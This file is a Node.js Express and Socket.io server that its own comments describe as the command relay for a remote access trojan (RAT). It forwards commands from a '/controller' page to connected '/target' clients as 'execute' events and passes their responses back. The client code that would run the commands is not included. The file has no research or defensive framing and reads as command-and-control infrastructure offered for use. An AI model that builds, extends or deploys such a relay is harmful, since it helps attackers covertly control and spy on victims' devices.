const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Serve static files
app.use(express.static(__dirname + '/controller'));
app.use(express.static(__dirname + '/target'));

// Routes
app.get('/controller', (req, res) => {
    res.sendFile(__dirname + '/controller/index.html');
});

app.get('/target', (req, res) => {
    res.sendFile(__dirname + '/target/index.html');
});

// Socket.io connections
io.on('connection', (socket) => {
    console.log('New client connected');
    
    socket.on('disconnect', () => {
        console.log('Client disconnected');
    });
    
    // Handle RAT commands
    socket.on('command', (data) => {
        console.log('Command received:', data);
        // Broadcast to target device
        socket.broadcast.emit('execute', data);
    });
    
    // Handle responses from target
    socket.on('response', (data) => {
        console.log('Response from target:', data);
        // Broadcast to controller
        socket.broadcast.emit('result', data);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});